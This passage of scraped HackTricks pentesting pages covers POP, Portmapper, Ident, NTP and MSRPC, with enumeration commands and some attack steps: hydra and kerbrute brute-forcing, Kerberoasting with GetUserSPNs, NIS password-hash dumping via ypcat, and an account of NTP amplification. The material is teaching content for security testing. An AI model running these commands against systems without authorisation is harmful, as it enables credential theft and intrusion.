resources.\n‚Äã\nhttps://book.hacktricks.xyz/pentesting/pentesting-kerberos-88\n‚Äã\nEntry_2:\nName: Pre-Creds\nDescription: Brute Force to get Usernames\nCommand: nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm=\"{Domain_Name}\",userdb={Big_Userlist} {IP}\n‚Äã\nEntry_3:\nName: With Usernames\nDescription: Brute Force with Usernames and Passwords\nNote: consider git clonehttps://github.com/ropnop/kerbrute.git ./kerbrute -h\n‚Äã\nEntry_4:\nName: With Creds\nDescription: Attempt to get a list of user service principal names\nCommand: GetUserSPNs.py -request -dc-ip {IP} active.htb/svc_tgs\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPrevious\nWordpress\nNext\nHarvesting tickets from Windows\nLast modified\n6mo ago"
    },
    {
        "title": "110,995 - Pentesting POP",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-pop",
        "text": "110,995 - Pentesting POP\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nFind vulnerabilities that matter most so you can fix them faster. Intruder tracks your attack surface, runs proactive threat scans, finds issues across your whole tech stack, from APIs to web apps and cloud systems.\nTry it for free\ntoday.\nIntruder | An Effortless Vulnerability Scanner\nBasic Information\nPost Office Protocol\n(\nPOP\n) is a type of computer networking and Internet standard\nprotocol\nthat extracts and retrieves email from a remote mail server for access by the host machine.\nPOP\nis an application layer\nprotocol\nin the OSI model that provides end users the ability to fetch and receive email (from\nhere\n).\nThe POP clients generally connect, retrieve all messages, store them on the client system, and delete them from the server. There are 3 versions of POP, but POP3 is the most used one.\nDefault ports:\n110, 995(ssl)\nPORT    STATE SERVICE\n110/tcp open  pop3\nEnumeration\nBanner Grabbing\nnc\n-nv\n<\nIP\n>\n110\nopenssl s_client\n-connect\n<\nIP\n>\n:995\n-crlf\n-quiet\nManual\nYou can use the command\nCAPA\nto obtain the capabilities of the POP3 server.\nAutomated\nnmap\n--script\n\"pop3-capabilities or pop3-ntlm-info\"\n-sV\n-port\n<\nPORT\n>\n<\nIP\n>\n#All are default scripts\nThe\npop3-ntlm-info\nplugin will return some \"\nsensitive\n\" data (Windows versions).\n‚Äã\nPOP3 bruteforce\n‚Äã\nPOP syntax\nPOP commands:\nUSER\nuid           Log\nin\nas\n\"uid\"\nPASS password      Substitue\n\"password\"\nfor\nyour actual password\nSTAT               List number of messages, total mailbox size\nLIST               List messages and sizes\nRETR n             Show message n\nDELE n             Mark message n\nfor\ndeletion\nRSET               Undo any changes\nQUIT               Logout\n(\nexpunges messages\nif\nno RSET\n)\nTOP msg n          Show first n lines of message number msg\nCAPA               Get capabilities\nFrom\nhere\n‚Äã\nExample:\nroot@kali:~# telnet $ip 110\n+OK beta POP3 server (JAMES POP3 Server 2.3.2) ready\nUSER billydean\n+OK\nPASS password\n+OK Welcome billydean\n‚Äã\nlist\n‚Äã\n+OK 2 1807\n1 786\n2 1021\n‚Äã\nretr 1\n‚Äã\n+OK Message follows\nFrom:\n[email¬†protected]\nDear Billy Dean,\n‚Äã\nHere is your login for remote desktop ... try not to forget it this time!\nusername: billydean\npassword: PA$$W0RD!Z\nDangerous Settings\nFrom\nhttps://academy.hackthebox.com/module/112/section/1073\n‚Äã\nSetting\nDescription\nauth_debug\nEnables all authentication debug logging.\nauth_debug_passwords\nThis setting adjusts log verbosity, the submitted passwords, and the scheme gets logged.\nauth_verbose\nLogs unsuccessful authentication attempts and their reasons.\nauth_verbose_passwords\nPasswords used for authentication are logged and can also be truncated.\nauth_anonymous_username\nThis specifies the username to be used when logging in with the ANONYMOUS SASL mechanism.\nHackTricks Automatic Commands\nProtocol_Name:  POP   #Protocol Abbreviation if there is one.\nPort_Number:  110     #Comma separated if there is more than one.\nProtocol_Description: Post Office Protocol         #Protocol Abbreviation Spelled out\n‚Äã\nEntry_1:\nName: Notes\nDescription: Notes for POP\nNote: |\nPost Office Protocol (POP) is a type of computer networking and Internet standard protocol that extracts and retrieves email from a remote mail server for access by the host machine. POP is an application layer protocol in the OSI model that provides end users the ability to fetch and receive email (from here).\nThe POP clients generally connect, retrieve all messages, store them on the client system, and delete them from the server. There are 3 versions of POP, but POP3 is the most used one.\n‚Äã\nhttps://book.hacktricks.xyz/pentesting/pentesting-whois\n‚Äã\nEntry_2:\nName: Banner Grab\nDescription: Banner Grab 110\nCommand: nc -nv {IP} 110\n‚Äã\nEntry_3:\nName: Banner Grab 995\nDescription: Grab Banner Secure\nCommand: openssl s_client -connect {IP}:995 -crlf -quiet\n‚Äã\nEntry_4:\nName: Nmap\nDescription: Scan for POP info\nCommand: nmap --script \"pop3-capabilities or pop3-ntlm-info\" -sV -p 110 {IP}\n‚Äã\nEntry_5:\nName: Hydra Brute Force\nDescription: Need User\nCommand: hydra -l {Username} -P {Big_Passwordlist} -f {IP} pop3 -V\nEntry_6:\nName: consolesless mfs enumeration\nDescription: POP3 enumeration without the need to run msfconsole\nNote: sourced from https://github.com/carlospolop/legion\nCommand: msfconsole -q -x 'use auxiliary/scanner/pop3/pop3_version; set RHOSTS {IP}; set RPORT 110; run; exit'\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\n‚Äã\n‚Äã\nFind vulnerabilities that matter most so you can fix them faster. Intruder tracks your attack surface, runs proactive threat scans, finds issues across your whole tech stack, from APIs to web apps and cloud systems.\nTry it for free\ntoday.\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPrevious\nHarvesting tickets from Linux\nNext\n- Network Services Pentesting\n111/TCP/UDP - Pentesting Portmapper\nLast modified\n2mo ago"
    },
    {
        "title": "111/TCP/UDP - Pentesting Portmapper",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-rpcbind",
        "text": "111/TCP/UDP - Pentesting Portmapper\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nBasic Information\nProvides information between Unix based systems. Port is often probed, it can be used to fingerprint the Nix OS, and to obtain information about available services. Port used with NFS, NIS, or any rpc-based service.\nDefault port:\n111/TCP/UDP, 32771 in Oracle Solaris\nPORT    STATE SERVICE\n111/tcp open  rpcbind\nEnumeration\nrpcinfo irked.htb\nnmap -sSUC -p111 192.168.10.1\nSometimes it doesn't give you any information, in other occasions you will get something like this:\nShodan\nport:111 portmap\nRPCBind + NFS\nIf you find the service NFS then probably you will be able to list and download(and maybe upload) files:\nRead\n2049 - Pentesting NFS service\nto learn more about how to test this protocol.\nNIS\nIf you find the service\nypbind\nrunning:\nYou can try to exploit it. Anyway, first of all you will\nneed to guess the NIS \"domain name\"\nof the machine (when NIS is installed it's configured a \"domain name\") and\nwithout knowing this domain name you cannot do anything\n.\nUpon obtaining the NIS domain name for the environment (example.org in this case), use the ypwhich command to ping the NIS server and ypcat to obtain sensitive material. You should feed encrypted password hashes into John the Ripper, and once cracked, you can use it to evaluate system access and privileges.\nroot@kali:~\n# apt-get install nis\nroot@kali:~\n# ypwhich -d example.org 192.168.10.1\npotatohead.example.org\nroot@kali:~\n# ypcat ‚Äìd example.org ‚Äìh 192.168.10.1 passwd.byname\ntiff:noR7Bk6FdgcZg:218:101::/export/home/tiff:/bin/bash\nkatykat:d.K5tGUWCJfQM:2099:102::/export/home/katykat:/bin/bash\njames:i0na7pfgtxi42:332:100::/export/home/james:/bin/tcsh\nflorent:nUNzkxYF0Hbmk:199:100::/export/home/florent:/bin/csh\ndave:pzg1026SzQlwc:182:100::/export/home/dave:/bin/bash\nyumi:ZEadZ3ZaW4v9.:1377:160::/export/home/yumi:/bin/bash\nMaster file\nMap(s)\nNotes\n/etc/hosts\nhosts.byname, hosts.byaddr\nContains hostnames and IP details\n/etc/passwd\npasswd.byname, passwd.byuid\nNIS user password file\n/etc/group\ngroup.byname, group.bygid\nNIS group file\n/usr/lib/aliases\nmail.aliases\nDetails mail aliases\nRPC Users\nIf you find the\nrusersd\nservice listed like this:\nYou could enumerate users of the box. To learn how read\n1026 - Pentesting Rsusersd\n.\nBypass Filtered Portmapper port\nIf during a nmap scan you see open ports like NFS but the port 111 is filtered, you won't be able to exploit those ports.\nBut, if you can simulate a locally a portmapper service and you tunnel the NFS port from your machine to the victim one, you will be able to use regular tools to exploit those services.\nMore information in\nhttps://medium.com/@sebnemK/how-to-bypass-filtered-portmapper-port-111-27cee52416bc\n‚Äã\nShodan\nPortmap\nLabs to practice\nPractice these techniques in the\nIrked HTB machine\n.\nHackTricks Automatic Commands\nProtocol_Name: Portmapper    #Protocol Abbreviation if there is one.\nPort_Number:  43     #Comma separated if there is more than one.\nProtocol_Description: PM or RPCBind        #Protocol Abbreviation Spelled out\n‚Äã\nEntry_1:\nName: Notes\nDescription: Notes for PortMapper\nNote: |\nProvides information between Unix based systems. Port is often probed, it can be used to fingerprint the Nix OS, and to obtain information about available services. Port used with NFS, NIS, or any rpc-based service.\n‚Äã\nhttps://book.hacktricks.xyz/pentesting/pentesting-rpcbind\n‚Äã\nEntry_2:\nName: rpc info\nDescription: May give netstat-type info\nCommand: whois -h {IP} -p 43 {Domain_Name} && echo {Domain_Name} | nc -vn {IP} 43\n‚Äã\nEntry_3:\nName: nmap\nDescription: May give netstat-type info\nCommand: nmap -sSUC -p 111 {IP}\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\n110,995 - Pentesting POP\nNext\n- Network Services Pentesting\n113 - Pentesting Ident\nLast modified\n5mo ago"
    },
    {
        "title": "113 - Pentesting Ident",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/113-pentesting-ident",
        "text": "113 - Pentesting Ident\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nUse\nTrickest\nto easily build and\nautomate workflows\npowered by the world's\nmost advanced\ncommunity tools.\nGet Access Today:\nWorkflow-powered solution for Bug Bounty, Pentesting, SecOps | Trickest\nTrickest\nBasic Information\nIs an\nInternet\nprotocol\nthat helps identify the user of a particular\nTCP\nconnection.\nDefault port:\n113\nPORT    STATE SERVICE\n113/tcp open  ident\nEnumeration\nManual - Get user/Identify the service\nIf a machine is running the service ident and samba (445) and you are connected to samba using the port 43218. You can get which user is running the samba service by doing:\nIf you just press enter when you conenct to the service:\nOther errors:\nNmap\nBy default (-sC) nmap will identify every user of every running port:\nPORT    STATE SERVICE     VERSION\n22/tcp  open  ssh         OpenSSH 4.3p2 Debian 9 (protocol 2.0)\n|_auth-owners: root\n| ssh-hostkey:\n|   1024 88:23:98:0d:9d:8a:20:59:35:b8:14:12:14:d5:d0:44 (DSA)\n|_  2048 6b:5d:04:71:76:78:56:96:56:92:a8:02:30:73:ee:fa (RSA)\n113/tcp open  ident\n|_auth-owners: identd\n139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: LOCAL)\n|_auth-owners: root\n445/tcp open  netbios-ssn Samba smbd 3.0.24 (workgroup: LOCAL)\n|_auth-owners: root\nIdent-user-enum\nIdent-user-enum is a simple PERL script to query the ident service (113/TCP) in order to determine the owner of the process listening on each TCP port of a target system. The list of usernames gathered can be used for password guessing attacks on other network services. It can be installed with\napt install ident-user-enum\n.\nroot@kali:/opt/local/recon/192.168.1.100# ident-user-enum 192.168.1.100 22 113 139 445\nident-user-enum v1.0 ( http://pentestmonkey.net/tools/ident-user-enum )\n\u0000\u0000‚Äã\n192.168.1.100:22  root\n192.168.1.100:113 identd\n192.168.1.100:139 root\n192.168.1.100:445 root\nShodan\noident\nFiles\nidentd.conf\nUse\nTrickest\nto easily build and\nautomate workflows\npowered by the world's\nmost advanced\ncommunity tools.\nGet Access Today:\nWorkflow-powered solution for Bug Bounty, Pentesting, SecOps | Trickest\nTrickest\nHackTricks Automatic Commands\nProtocol_Name: Ident    #Protocol Abbreviation if there is one.\nPort_Number:  113     #Comma separated if there is more than one.\nProtocol_Description: Identification Protocol         #Protocol Abbreviation Spelled out\n‚Äã\nEntry_1:\nName: Notes\nDescription: Notes for Ident\nNote: |\nIs an Internet protocol that helps identify the user of a particular TCP connection.\n‚Äã\nhttps://book.hacktricks.xyz/pentesting/113-pentesting-ident\n‚Äã\nEntry_2:\nName: Enum Users\nDescription: Enumerate Users\nNote: apt install ident-user-enum    ident-user-enum {IP} 22 23 139 445 (try all open ports)\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\n111/TCP/UDP - Pentesting Portmapper\nNext\n- Network Services Pentesting\n123/udp - Pentesting NTP\nLast modified\n2mo ago"
    },
    {
        "title": "123/udp - Pentesting NTP",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-ntp",
        "text": "123/udp - Pentesting NTP\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nHackenProof is home to all crypto bug bounties.\nGet rewarded without delays\nHackenProof bounties launch only when their customers deposit the reward budget. You'll get the reward after the bug is verified.\nGet experience in web3 pentesting\nBlockchain protocols and smart contracts are the new Internet! Master web3 security at its rising days.\nBecome the web3 hacker legend\nGain reputation points with each verified bug and conquer the top of the weekly leaderboard.\n‚Äã\nSign up on HackenProof\nstart earning from your hacks!\nHackenProof\nBasic Information\nThe Network Time Protocol (\nNTP\n) is a networking protocol for clock synchronization between computer systems over packet-switched, variable-latency data networks.\nDefault port:\n123/udp\nPORT    STATE SERVICE REASON\n123/udp open  ntp     udp-response\nEnumeration\nntpq\n-c\nreadlist\n<\nIP_ADDRESS\n>\nntpq\n-c\nreadvar\n<\nIP_ADDRESS\n>\nntpq\n-c\npeers\n<\nIP_ADDRESS\n>\nntpq\n-c\nassociations\n<\nIP_ADDRESS\n>\nntpdc\n-c\nmonlist\n<\nIP_ADDRESS\n>\nntpdc\n-c\nlistpeers\n<\nIP_ADDRESS\n>\nntpdc\n-c\nsysinfo\n<\nIP_ADDRESS\n>\nnmap\n-sU\n-sV\n--script\n\"ntp* and (discovery or vuln) and not (dos or brute)\"\n-p\n123\n<\nIP\n>\nExamine configuration files\nntp.conf\nNTP Amplification Attack\n‚Äã\nHow NTP DDoS Attack Works\n‚Äã\nNTP protocol by design uses UDP to operate, which does not require any handshake like TCP, thus no record of the request. So, NTP DDoS amplification attack begins when an attacker crafts packets with a spoofed source IP to make the packets appear to be coming from the intended target and sends them to NTP server. Attacker initially crafts the packet of few bytes, but NTP responds with a large amount of data thus adding to amplification of this attack.\nMONLIST command\n: It is a NTP protocol command which has very little use, but it is this command which is the main culprit for this attack. However, the use of MONLIST command is to give details of the last 600 clients that have connected to the NTP time service. Below is the command syntax:\nntpdc\n-n\n-c\nmonlist\n<\nIP\n>\nShodan\nntp\nHackTricks Automatic Commands\nProtocol_Name: NTP    #Protocol Abbreviation if there is one.\nPort_Number:  123     #Comma separated if there is more than one.\nProtocol_Description: Network Time Protocol         #Protocol Abbreviation Spelled out\n‚Äã\nEntry_1:\nName: Notes\nDescription: Notes for NTP\nNote: |\nThe Network Time Protocol (NTP) is a networking protocol for clock synchronization between computer systems over packet-switched, variable-latency data networks.\n‚Äã\nhttps://book.hacktricks.xyz/pentesting/pentesting-ntp\n‚Äã\nEntry_2:\nName: Nmap\nDescription: Enumerate NTP\nCommand: nmap -sU -sV --script \"ntp* and (discovery or vuln) and not (dos or brute)\" -p 123 {IP}\n‚Äã\nHackenProof is home to all crypto bug bounties.\nGet rewarded without delays\nHackenProof bounties launch only when their customers deposit the reward budget. You'll get the reward after the bug is verified.\nGet experience in web3 pentesting\nBlockchain protocols and smart contracts are the new Internet! Master web3 security at its rising days.\nBecome the web3 hacker legend\nGain reputation points with each verified bug and conquer the top of the weekly leaderboard.\n‚Äã\nSign up on HackenProof\nstart earning from your hacks!\nHackenProof\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\n113 - Pentesting Ident\nNext\n- Network Services Pentesting\n135, 593 - Pentesting MSRPC\nLast modified\n4mo ago"
    },
    {
        "title": "135, 593 - Pentesting MSRPC",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/135-pentesting-msrpc",
        "text": "135, 593 - Pentesting MSRPC\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nHackenProof is home to all crypto bug bounties.\nGet rewarded without delays\nHackenProof bounties launch only when their customers deposit the reward budget. You'll get the reward after the bug is verified.\nGet experience in web3 pentesting\nBlockchain protocols and smart contracts are the new Internet! Master web3 security at its rising days.\nBecome the web3 hacker legend\nGain reputation points with each verified bug and conquer the top of the weekly leaderboard.\n‚Äã\nSign up on HackenProof\nstart earning from your hacks!\nHackenProof\nBasic Information\nMicrosoft Remote Procedure Call, also known as a function call or a subroutine call, is\na protocol\nthat uses the client-server model in order to allow one program to request service from a program on another computer without having to understand the details of that computer's network. MSRPC was originally derived from open source software but has been developed further and copyrighted by Microsoft.\nDepending on the host configuration, the RPC endpoint mapper can be accessed through TCP and UDP port 135, via SMB with a null or authenticated session (TCP 139 and 445), and as a web service listening on TCP port 593.\n135/tcp   open     msrpc         Microsoft Windows RPC\nHow does MSRPC work?\n‚Äã\nThe MSRPC process begins on the client side\n, with the client application calling a local stub procedure instead of code implementing the procedure. The client stub code retrieves the required parameters from the client address space and delivers them to the client runtime library, which then translates the parameters into a standard Network Data Representation format to transmit to the server.\nThe client stub then calls functions in the RPC client runtime library to send the request and parameters to the server. If the server is located remotely, the runtime library specifies an appropriate transport protocol and engine and passes the RPC to the network stack for transport to the server.\nFrom here:\nhttps://www.extrahop.com/resources/protocols/msrpc/\n‚Äã\nImage From book \"\nNetwork Security Assesment 3rd Edition\n\"\nIdentifying Exposed RPC Services\nSection extracted from book \"\nNetwork Security Assesment 3rd Edition\n\"\nYou can query the RPC locator service and individual RPC endpoints to catalog interesting services running over TCP, UDP, HTTP, and SMB (via named pipes). Each IFID value gathered through this process denotes an RPC service (e.g., 5a7b91f8-ff00-11d0-a9b2-00c04fb6e6fc is the Messenger interface).\nTodd Sabin‚Äôs rpcdump and ifids Windows utilities query both the RPC locator and specific RPC endpoints to list IFID values. The rpcdump syntax is as follows:\nD:\\rpctools> rpcdump [-p port] 192.168.189.1\nIfId: 5a7b91f8-ff00-11d0-a9b2-00c04fb6e6fc version 1.0\nAnnotation: Messenger Service\nUUID: 00000000-0000-0000-0000-000000000000\nBinding: ncadg_ip_udp:192.168.189.1[1028]\nYou can access the RPC locator service by using four protocol sequences:\nncacn_ip_tcp and ncadg_ip_udp (TCP and UDP port 135)\nncacn_np (the \\pipe\\epmapper named pipe via SMB)\nncacn_http (RPC over HTTP via TCP port 80, 593, and others)\nuse auxiliary/scanner/dcerpc/endpoint_mapper\nuse auxiliary/scanner/dcerpc/hidden\nuse auxiliary/scanner/dcerpc/management\nuse auxiliary/scanner/dcerpc/tcp_dcerpc_auditor\nrpcdump.py\n<\nIP\n>\n-p\n135\nNote that from the mentioned options all except of\ntcp_dcerpc_auditor\ncan\nonly\nbe executed against\nmsrpc\nin\nport 135\n.\nNotable RPC interfaces\nIFID value\nNamed pipe\nDescription\n12345778-1234-abcd-ef00-0123456789ab\n\\pipe\\lsarpc\nLSA interface, used to enumerate users\n3919286a-b10c-11d0-9ba8-00c04fd92ef5\n\\pipe\\lsarpc\nLSA Directory Services (DS) interface, used to enumerate domains and trust relationships\n12345778-1234-abcd-ef00-0123456789ac\n\\pipe\\samr\nLSA SAMR interface, used to access public SAM database elements (e.g., usernames) and brute-force user passwords regardless of account lockout policy\nOreilly library\n‚Äã\n1ff70682-0a51-30e8-076d-740be8cee98b\n\\pipe\\atsvc\nTask scheduler, used to remotely execute commands\n338cd001-2244-31f1-aaaa-900038001003\n\\pipe\\winreg\nRemote registry service, used to access the system registry\n367abb81-9844-35f1-ad32-98f038001003\n\\pipe\\svcctl\nService control manager and server services, used to remotely start and stop services and execute commands\n4b324fc8-1670-01d3-1278-5a47bf6ee188\n\\pipe\\srvsvc\nService control manager and server services, used to remotely start and stop services and execute commands\n4d9f4ab8-7d1c-11cf-861e-0020af6e7c57\n\\pipe\\epmapper\nDCOM interface, supporting WMI\nIdentifying IP addresses\nUsing\nhttps://github.com/mubix/IOXIDResolver\n, comes from\nAirbus research\nis possible to abuse the\nServerAlive2\nmethod inside the\nIOXIDResolver\ninterface.\nThis method has been used to get interface information as\nIPv6\naddress from the HTB box\nAPT\n. See\nhere\nfor 0xdf APT writeup, it includes an alternative method using rpcmap.py from\nImpacket\nwith\nstringbinding\n(see above).\nReferences:\n‚Äã\nhttps://www.cyber.airbus.com/the-oxid-resolver-part-1-remote-enumeration-of-network-interfaces-without-any-authentication/\n‚Äã\n‚Äã\nhttps://www.cyber.airbus.com/the-oxid-resolver-part-2-accessing-a-remote-object-inside-dcom/\n‚Äã\nPort 593\nThe\nrpcdump.exe\nfrom\nrpctools\ncan interact with this port.\n‚Äã\nHackenProof is home to all crypto bug bounties.\nGet rewarded without delays\nHackenProof bounties launch only when their customers deposit the reward budget. You'll get the reward after the bug is verified.\nGet experience in web3 pentesting\nBlockchain protocols and smart contracts are the new Internet! Master web3 security at its rising days.\nBecome the web3 hacker legend\nGain reputation points with each verified bug and conquer the top of the weekly leaderboard.\n‚Äã\nSign up on HackenProof\nstart earning from your hacks!\nHackenProof\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\n123/udp - Pentesting NTP\nNext\n- Network Services Pentesting\n137,138,139 - Pentesting NetBios\nLast modified\n4mo ago"
    },
    {
        "title": "137,138,139 - Pentesting NetBios",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/137-138-139-pentesting-netbios",
